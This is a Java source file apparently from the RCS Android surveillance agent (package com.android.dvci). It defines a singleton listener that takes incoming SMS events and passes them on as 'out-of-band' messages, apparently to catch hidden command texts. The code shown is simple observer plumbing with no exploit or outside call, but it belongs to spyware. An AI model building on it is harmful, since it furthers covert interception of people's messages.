/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ListenerSms.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.listener;

import com.android.dvci.auto.Cfg;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.module.message.LowEventSms;
import com.android.dvci.module.message.OutOfBandSms;
import com.android.dvci.util.Check;

public class ListenerOOBSms extends Listener<OutOfBandSms> implements Observer<LowEventSms> {
	/** The Constant TAG. */
	private static final String TAG = "ListenerOob"; //$NON-NLS-1$
	private static LowEventHandler lle=null;
	/** The singleton. */
	private volatile static ListenerOOBSms singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static ListenerOOBSms self() {
		if (singleton == null) {
			synchronized (ListenerOOBSms.class) {
				if (singleton == null) {
					singleton = new ListenerOOBSms();
				}
			}
		}
		return singleton;
	}

	@Override
	public synchronized boolean attach(Observer<OutOfBandSms> o) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " attach");//$NON-NLS-1$
		}
		return super.attach(o);
	}

	@Override
	public synchronized void detach(Observer<OutOfBandSms> o) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " dettach");//$NON-NLS-1$
		}
		super.detach(o);
	}

	@Override
	protected void start() {
		LowEventHandlerSms.self().attach(this);
	}

	@Override
	protected void stop() {
		LowEventHandlerSms.self().detach(this);
	}

	@Override
	public int notification(LowEventSms b) {

		dispatch(new OutOfBandSms(b));
		return 1;
	}
}
